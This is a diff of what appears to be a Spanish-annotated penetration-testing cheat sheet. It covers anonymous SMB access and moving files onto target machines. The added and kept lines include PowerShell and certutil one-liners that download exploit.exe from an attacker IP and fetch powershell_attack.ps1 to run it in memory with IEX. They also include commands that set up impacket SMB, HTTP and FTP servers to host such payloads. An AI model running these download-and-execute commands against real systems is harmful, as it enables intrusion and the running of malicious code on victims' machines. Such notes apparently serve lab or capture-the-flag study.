@@ -67,12 +67,14 @@ smbclient //X.X.X.X/tmp -N --> parametro -N conecta como anonymous
 mount -t cifs //X.X.X.X/remotefolder /mnt/mountfolder -o username=null, password=null,domain=WORKGROUP,rw. --> montar carpeta localmente
 
 
-##Download HTTP##
+##Download/upload HTTP##
+-Cliente-
+New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\X.X.X.X\Folder
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.55:8000/exploit.exe', 'C:\users\ususario\Desktop\exploit.exe')"
 powershell "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.x:xxx/powershell_attack.ps1')"
 certutil.exe -f -urlcache -split http://X.X.X.X:8000/exploit.exe exploit.exe
-
-##Transfer files##
+-Server-
+impacket-smbserver smbFolder FOLDER
 Python -m SimpleHTTPServer
 Python3 -m http.server
 Python -m pyftpdlib -p 21 -w
